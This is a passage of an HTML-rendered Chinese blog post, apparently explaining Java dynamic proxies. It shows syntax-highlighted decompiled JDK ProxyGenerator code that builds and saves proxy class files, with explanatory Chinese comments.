punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>                            var2 <span class=\"token operator\">=</span> var3<span class=\"token punctuation\">.</span><span class=\"token function\">resolve</span><span class=\"token punctuation\">(</span>var0<span class=\"token punctuation\">.</span><span class=\"token function\">substring</span><span class=\"token punctuation\">(</span>var1 <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> var0<span class=\"token punctuation\">.</span><span class=\"token function\">length</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token string\">\".class\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>                        <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>                            var2 <span class=\"token operator\">=</span> <span class=\"token class-name\">Paths</span><span class=\"token punctuation\">.</span><span class=\"token function\">get</span><span class=\"token punctuation\">(</span>var0 <span class=\"token operator\">+</span> <span class=\"token string\">\".class\"</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">String</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>                        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>                        <span class=\"token class-name\">Files</span><span class=\"token punctuation\">.</span><span class=\"token function\">write</span><span class=\"token punctuation\">(</span>var2<span class=\"token punctuation\">,</span> var4<span class=\"token punctuation\">,</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">OpenOption</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>                        <span class=\"token keyword\">return</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>                    <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">catch</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">IOException</span> var4x<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>                        <span class=\"token keyword\">throw</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">InternalError</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"I/O exception saving generated file: \"</span> <span class=\"token operator\">+</span> var4x<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>                    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>                <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>            <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>        <span class=\"token keyword\">return</span> var4<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>生成代理类字节码文件的 generateClassFile 方法:</p>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">private</span> <span class=\"token keyword\">byte</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token function\">generateClassFile</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>        <span class=\"token comment\">// 下面一系列的 addProxyMethod 方法是将接口中的方法和 Object 中的方法添加到代理方法中 (proxyMethod)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>        <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span><span class=\"token function\">addProxyMethod</span><span class=\"token punctuation\">(</span>hashCodeMethod<span class=\"token punctuation\">,</span> <span class=\"token class-name\">Object</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>        <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span><span class=\"token function\">addProxyMethod</span><span class=\"token punctuation\">(</span>equalsMethod<span class=\"token punctuation\">,</span> <span class=\"token class-name\">Object</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>        <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span><span class=\"token function\">addProxyMethod</span><span class=\"token punctuation\">(</span>toStringMethod<span class=\"token punctuation\">,</span> <span class=\"token class-name\">Object</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        <span class=\"token class-name\">Class</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> var1 <span class=\"token operator\">=</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>interfaces<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        <span class=\"token keyword\">int</span> var2 <span class=\"token operator\">=</span> var1<span class=\"token punctuation\">.</span>length<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        <span class=\"token keyword\">int</span> var3<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        <span class=\"token class-name\">Class</span> var4<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>        <span class=\"token comment\">// 获得接口中所有方法并添加到代理方法中</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        <span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span>var3 <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> var3 <span class=\"token operator\">&lt;</span> var2<span class=\"token punctuation\">;</span> <span class=\"token operator\">++</span>var3<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>            var4 <span class=\"token operator\">=</span> var1<span class=\"token punctuation\">[</span>var3<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>            <span class=\"token class-name\">Method</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> var5 <span class=\"token operator\">=</span> var4<span class=\"token punctuation\">.</span><span class=\"token function\">getMethods</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>            <span class=\"token keyword\">int</span> var6 <span class=\"token operator\">=</span> var5<span class=\"token punctuation\">.</span>length<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>            <span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> var7 <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> var7 <span class=\"token operator\">&lt;</span> var6<span class=\"token punctuation\">;</span> <span class=\"token operator\">++</span>var7<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>                <span class=\"token class-name\">Method</span> var8 <span class=\"token operator\">=</span> var5<span class=\"token punctuation\">[</span>var7<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>                <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span><span class=\"token function\">addProxyMethod</span><span class=\"token punctuation\">(</span>var8<span class=\"token punctuation\">,</span> var4<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>            <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>        <span class=\"token class-name\">Iterator</span> var11 <span class=\"token operator\">=</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>proxyMethods<span class=\"token punctuation\">.</span><span class=\"token function\">values</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">iterator</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>        <span class=\"token class-name\">List</span> var12<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>        <span class=\"token keyword\">while</span><span class=\"token punctuation\">(</span>var11<span class=\"token punctuation\">.</span><span class=\"token function\">hasNext</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>            var12 <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">List</span><span class=\"token punctuation\">)</span>var11<span class=\"token punctuation\">.</span><span class=\"token function\">next</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>            <span class=\"token function\">checkReturnTypes</span><span class=\"token punctuation\">(</span>var12<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>        <span class=\"token class-name\">Iterator</span> var15<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>        <span class=\"token keyword\">try</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>            <span class=\"token comment\">// 生成代理类的构造函数</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>            <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>methods<span class=\"token punctuation\">.</span><span class=\"token function\">add</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span><span class=\"token function\">generateConstructor</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>            var11 <span class=\"token operator\">=</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>proxyMethods<span class=\"token punctuation\">.</span><span class=\"token function\">values</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">iterator</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>            <span class=\"token keyword\">while</span><span class=\"token punctuation\">(</span>var11<span class=\"token punctuation\">.</span><span class=\"token function\">hasNext</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>                var12 <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">List</span><span class=\"token punctuation\">)</span>var11<span class=\"token punctuation\">.</span><span class=\"token function\">next</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>                var15 <span class=\"token operator\">=</span> var12<span class=\"token punctuation\">.</span><span class=\"token function\">iterator</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>                    </pre></td></tr><tr><td data-num=\"41\"></td><td><pre>                <span class=\"token keyword\">while</span><span class=\"token punctuation\">(</span>var15<span class=\"token punctuation\">.</span><span class=\"token function\">hasNext</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>                    <span class=\"token class-name\">ProxyGenerator<span class=\"token punctuation\">.</span>ProxyMethod</span> var16 <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">ProxyGenerator<span class=\"token punctuation\">.</span>ProxyMethod</span><span class=\"token punctuation\">)</span>var15<span class=\"token punctuation\">.</span><span class=\"token function\">next</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>                    <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>fields<span class=\"token punctuation\">.</span><span class=\"token function\">add</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">ProxyGenerator<span class=\"token punctuation\">.</span>FieldInfo</span><span class=\"token punctuation\">(</span>var16<span class=\"token punctuation\">.</span>methodFieldName<span class=\"token punctuation\">,</span> <span class=\"token string\">\"Ljava/lang/reflect/Method;\"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">10</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>                    <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>methods<span class=\"token punctuation\">.</span><span class=\"token function\">add</span><span class=\"token punctuation\">(</span>var16<span class=\"token punctuation\">.</span><span class=\"token function\">generateMethod</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>                <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>            <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>            <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>methods<span class=\"token punctuation\">.</span><span class=\"token function\">add</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span><span class=\"token function\">generateStaticInitializer</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">catch</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">IOException</span> var10<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>            <span class=\"token keyword\">throw</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">InternalError</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"unexpected I/O Exception\"</span><span class=\"token punctuation\">,</span> var10<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>methods<span class=\"token punctuation\">.</span><span class=\"token function\">size</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">></span> <span class=\"token char\">'\\uffff'</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>            <span class=\"token keyword\">throw</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">IllegalArgumentException</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"method limit exceeded\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>fields<span class=\"token punctuation\">.</span><span class=\"token function\">size</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">></span> <span class=\"token char\">'\\uffff'</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre>            <span class=\"token keyword\">throw</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">IllegalArgumentException</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"field limit exceeded\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre>            <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>cp<span class=\"token punctuation\">.</span><span class=\"token function\">getClass</span><span class=\"token punctuation\">(</span><span class=\"token function\">dotToSlash</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>className<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre>            <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>cp<span class=\"token punctuation\">.</span><span class=\"token function\">getClass</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"java/lang/reflect/Proxy\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre>            var1 <span class=\"token operator\">=</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>interfaces<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre>            var2 <span class=\"token operator\">=</span> var1<span class=\"token punctuation\">.</span>length<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre></pre></td></tr><tr><td data-num=\"63\"></td><td><pre>            <span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span>var3 <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> var3 <span class=\"token operator\">&lt;</span> var2<span class=\"token punctuation\">;</span> <span class=\"token operator\">++</span>var3<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre>                var4 <span class=\"token operator\">=</span> var1<span class=\"token punctuation\">[</span>var3<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"65\"></td><td><pre>                <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>cp<span class=\"token punctuation\">.</span><span class=\"token function\">getClass</span><span class=\"token punctuation\">(</span><span class=\"token function\">dotToSlash</span><span class=\"token punctuation\">(</span>var4<span class=\"token punctuation\">.</span><span class=\"token function\">getName</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"66\"></td><td><pre>            <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"67\"></td><td><pre></pre></td></tr><tr><td data-num=\"68\"></td><td><pre>            <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>cp<span class=\"token punctuation\">.</span><span class=\"token function\">setReadOnly</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"69\"></td><td><pre>            <span class=\"token class-name\">ByteArrayOutputStream</span> var13 <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">ByteArrayOutputStream</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"70\"></td><td><pre>            <span class=\"token class-name\">DataOutputStream</span> var14 <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">DataOutputStream</span><span class=\"token punctuation\">(</span>var13<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"71\"></td><td><pre></pre></td></tr><tr><td data-num=\"72\"></td><td><pre>            <span class=\"token keyword\">try</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"73\"></td><td><pre>                var14<span class=\"token punctuation\">.</span><span class=\"token function\">writeInt</span><span class=\"token punctuation\">(</span><span class=\"token operator\">-</span><span class=\"token number\">889275714</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"74\"></td><td><pre>                var14<span class=\"token punctuation\">.</span><span class=\"token function\">writeShort</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"75\"></td><td><pre>                var14<span class=\"token punctuation\">.</span><span class=\"token function\">writeShort</span><span class=\"token punctuation\">(</span><span class=\"token number\">49</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"76\"></td><td><pre>                <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>cp<span class=\"token punctuation\">.</span><span class=\"token function\">write</span><span class=\"token punctuation\">(</span>var14<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"77\"></td><td><pre>                var14<span class=\"token punctuation\">.</span><span class=\"token function\">writeShort</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>accessFlags<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"78\"></td><td><pre>                var14<span class=\"token punctuation\">.</span><span class=\"token function\">writeShort</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>cp<span class=\"token punctuation\">.</span><span class=\"token function\">getClass</span><span class=\"token punctuation\">(</span><span class=\"token function\">dotToSlash</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>className<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"79\"></td><td><pre>                var14<span class=\"token punctuation\">.</span><span class=\"token function\">writeShort</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>cp<span class=\"token punctuation\">.</span><span class=\"token function\">getClass</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"java/lang/reflect/Proxy\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"80\"></td><td><pre>                var14<span class=\"token punctuation\">.</span><span class=\"token function\">writeShort</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>interfaces<span class=\"token punctuation\">.</span>length<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"81\"></td><td><pre>                <span class=\"token class-name\">Class</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> var17 <span class=\"token operator\">=</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>interfaces<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"82\"></td><td><pre>                <span class=\"token keyword\">int</span> var18 <span class=\"token operator\">=</span> var17<span class=\"token punctuation\">.</span>length<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"83\"></td><td><pre></pre></td></tr><tr><td data-num=\"84\"></td><td><pre>                <span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> var19 <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> var19 <span class=\"token operator\">&lt;</span> var18<span class=\"token punctuation\">;</span> <span class=\"token operator\">++</span>var19<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"85\"></td><td><pre>                    <span class=\"token class-name\">Class</span> var22 <span class=\"token operator\">=</span> var17<span class=\"token punctuation\">[</span>var19<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"86\"></td><td><pre>                    var14<span class=\"token punctuation\">.</span><span class=\"token function\">writeShort</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>cp<span class=\"token punctuation\">.</span><span class=\"token function\">getClass</span><span class=\"token punctuation\">(</span><span class=\"token function\">dotToSlash</span><span class=\"token punctuation\">(</span>var22<span class=\"token punctuation\">.</span><span class=\"token function\">getName</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"87\"></td><td><pre>                <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"88\"></td><td><pre></pre></td></tr><tr><td data-num=\"89\"></td><td><pre>                var14<span class=\"token punctuation\">.</span><span class=\"token function\">writeShort</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>fields<span class=\"token punctuation\">.</span><span class=\"token function\">size</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"90\"></td><td><pre>                var15 <span class=\"token operator\">=</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>fields<span class=\"token punctuation\">.</span><span class=\"token function\">iterator</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"91\"></td><td><pre></pre></td></tr><tr><td data-num=\"92\"></td><td><pre>                <span class=\"token keyword\">while</span><span class=\"token punctuation\">(</span>var15<span class=\"token punctuation\">.</span><span class=\"token function\">hasNext</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"93\"></td><td><pre>                    <span class=\"token class-name\">ProxyGenerator<span class=\"token punctuation\">.</span>FieldInfo</span> var20 <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">ProxyGenerator<span class=\"token punctuation\">.</span>FieldInfo</span><span class=\"token punctuation\">)</span>var15<span class=\"token punctuation\">.</span><span class=\"token function\">next</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"94\"></td><td><pre>                    var20<span class=\"token punctuation\">.</span><span class=\"token function\">write</span><span class=\"token punctuation\">(</span>var14<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"95\"></td><td><pre>                <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"96\"></td><td><pre></pre></td></tr><tr><td data-num=\"97\"></td><td><pre>                var14<span class=\"token punctuation\">.</span><span class=\"token function\">writeShort</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>methods<span class=\"token punctuation\">.</span><span class=\"token function\">size</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"98\"></td><td><pre>                var15 <span class=\"token operator\">=</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>methods<span class=\"token punctuation\">.</span><span class=\"token function\">iterator</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"99\"></td><td><pre></pre></td></tr><tr><td data-num=\"100\"></td><td><pre>                <span class=\"token keyword\">while</span><span class=\"token punctuation\">(</span>var15<span class=\"token punctuation\">.</span><span class=\"token function\">hasNext</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"101\"></td><td><pre>                 